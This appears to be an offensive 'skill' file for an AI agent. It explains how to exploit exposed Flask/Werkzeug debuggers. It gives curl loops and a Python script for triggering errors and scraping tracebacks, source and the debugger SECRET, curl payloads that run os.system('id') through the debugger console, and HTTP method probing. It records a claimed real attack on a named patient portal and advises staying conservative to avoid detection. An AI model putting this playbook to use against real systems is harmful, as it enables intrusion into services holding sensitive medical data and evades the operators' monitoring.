---
name: flask-werkzeug-attack
description: "Exploit Flask/Werkzeug debugger exposure — traceback disclosure, SECRET extraction, console RCE (if enabled), server path disclosure, and Python stack trace information gathering"
sources: field_recon, patientportal_com_deep_probe_june_2026
report_count: 1
category: recon
---

# Flask/Werkzeug Debugger Exploitation

Flask applications with `debug=True` enable the Werkzeug debugger, which exposes stack traces and (optionally) an interactive Python console. The debugger runs at the same port as the Flask app and activates on any unhandled exception (HTTP 500).

## When to Use

- Port scan reveals an unknown HTTP service on a non-standard port (8080, 8081, 8084, 5000, 8000, etc.)
- An API endpoint returns HTTP 500 with a Flask/Werkzeug error page
- A `?__debugger__=yes` parameter appears in URL resources (CSS, JS, PNG)
- The error page contains `var CONSOLE_MODE`, `var EVALEX`, or `SECRET=` in the HTML

## Prerequisites

- `terminal` tool with curl
- A Flask API server with `debug=True` in production (misconfiguration)
- An endpoint that triggers HTTP 500 (unhandled exception)

## Quick Detection

```bash
# Check if Werkzeug debugger is active — trigger an error
curl -sk "https://target.com:PORT/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5

# Try to trigger error on common paths
for path in "/error" "/500" "/test" "/debug" "/sitemap.xml" "/env" "/config"; do
  result=$(curl -sk "https://target.com:PORT$path" 2>/dev/null)
  if echo "$result" | grep -q "Traceback\|Error\|Werkzeug"; then
    echo "TRIGGERED: $path"
    echo "$result" | grep -oE '(File|Error|SECRET|CONSOLE_MODE|EVALEX)[^<]*' | head -5
  fi
done
```

## Phase 1 — Information Disclosure

The Werkzeug debugger exposes:

### 1a — Server Paths (from Traceback)
```
File "/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/flask/app.py"
File "/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/flask_cors/extension.py"
File "/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/..."
```

### 1b — Debugger SECRET (from HTML)
```html
<script>
  var CONSOLE_MODE = false,
      EVALEX = false,
      EVALEX_TRUSTED = false,
      SECRET="vYQ93K...8cww";
</script>
```

### 1c — Framework & Language Version
- Flask framework (Python 3.x)
- flask_cors extension status
- Full call stack with line numbers
- Source code context (5 lines around each frame)

### 1d — Full Code Context Extraction

```python
import requests, re

resp = requests.get("https://target.com:PORT/ERROR_PATH", verify=False)
traceback = resp.text

# Extract all filenames from traceback frames
files = re.findall(r'File\s+\"([^\"]+)\"', traceback)
for f in files:
    print(f"  {f}")

# Extract source code snippets
sources = re.findall(r'<pre[^>]*class="source[^"]*"[^>]*>(.*?)</pre>', traceback, re.DOTALL)
for s in sources:
    clean = re.sub(r'<[^>]+>', '', s)
    print(clean[:200])
```

## Phase 2 — Debugger Console Access (RCE)

The Werkzeug debugger console allows Python code execution on the server IF `EVALEX=true` and `CONSOLE_MODE=true`.

### 2a — Check Console Status

```bash
# The SECRET and console mode are in the HTML
curl -sk "https://target.com:PORT/sitemap.xml" | grep -oE '(CONSOLE_MODE|EVALEX|EVALEX_TRUSTED|SECRET)="?[^"&;]+'
```

### 2b — Console Access (if enabled)

If `EVALEX=true`:

```bash
# Access the console
curl -sk "https://target.com:PORT/console"
```

**Signal check:** If `/console` returns HTTP 400 (not 404), the debugger IS active but the console is disabled. HTTP 404 means no debugger at all. HTTP 200 with console UI means RCE is available.

If `EVALEX=true`:

```bash
# Execute Python commands (POST to the debugger endpoint)
curl -sk -X POST "https://target.com:PORT/sitemap.xml?__debugger__=yes&cmd=e&s=SECRET" \
  -d "code=__import__('os').system('id')"

# Alternative: GET-based eval
curl -sk "https://target.com:PORT/sitemap.xml?__debugger__=yes&cmd=eval&code=__import__('os').system('id')&s=SECRET"
```

**Note:** The console endpoint may require specific method (POST vs GET) and may return HTTP 405 if the wrong method is used. Test both.

### 2c — Working with a Disabled Console

If `EVALEX=false` (most common in production), the console is **disabled** and cannot execute commands. However:

1. **SECRET is still valuable** — it confirms dynamic debugger is active
2. **Traceback still leaks** — full server paths, framework versions, source code context
3. **Look for `?__debugger__=yes`** — this is the debugger interface itself; if it loads, the debugger is partially active
4. **Check for source code in error pages** — some endpoints may return full source context without needing the console

## Phase 3 — Directory/Path Probing

Beyond the specific error-triggering path, probe for other endpoints that may leak different info:

```bash
# Path traversal in error generation
curl -sk "https://target.com:PORT/path/to/../sitemap.xml"

# Test various HTTP methods
curl -sk -X OPTIONS "https://target.com:PORT/sitemap.xml"
curl -sk -X PUT "https://target.com:PORT/sitemap.xml"
curl -sk -X DELETE "https://target.com:PORT/sitemap.xml"

# Check if error page returns CORS headers
curl -sk -D- "https://target.com:PORT/sitemap.xml" | grep -i access-control
```

## Real Production Example

### Target: patientportal.com (Port 8084, June 2026)

| Finding | Value |
|---------|-------|
| Trigger path | `/sitemap.xml` (HTTP 500) |
| Error | `NameError: name 'Response' is not defined` |
| Framework | Flask (Python 3.10) |
| Server path | `/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/flask/app.py` |
| SECRET | `vYQ93K...8cww` (exposed in HTML) |
| Console | DISABLED (`EVALEX=false`, `CONSOLE_MODE=false`) |
| CORS | `Access-Control-Allow-Origin: *` on error page |
| Other endpoints | POST `/login` returns JSON, POST `/register` returns HTTP 403 |

## Pitfalls

- **EVALEX=false means NO RCE through the console.** Do not waste time trying to execute code when console mode is disabled.
- **The SECRET is not enough.** Even with the correct SECRET, the console must be enabled for code execution.
- **Not all HTTP 500 pages are Werkzeug.** Plain Flask error pages without HTML formatting or with JSON-only responses are NOT the Werkzeug debugger. The debugger has a distinctive blue-themed HTML page with collapsible traceback frames and source code context.
- **The debugger may be behind CORS.** Check `Access-Control-Allow-Origin` headers — CORS wildcard on the debugger page means an attacker-controlled website can read the SECRET and traceback via fetch().
- **Triggering errors leaves logs.** Every debugger page request generates a 500 error in the server logs. Be conservative to avoid detection.

## Related Skills

- **`hunt-rce`** — General RCE hunting; console-enabled Werkzeug would be RCE
- **`hunt-python`** — Python-specific vulnerability hunting
- **`js-secrets-extraction`** — Finding API keys that may work with the Flask API
- **`source-leak-hunt`** — Finding .env and config files that may contain Flask SECRET_KEY
- **`cache-attack`** — Cache poisoning via Werkzeug error page (if CDN caches the 500 response)
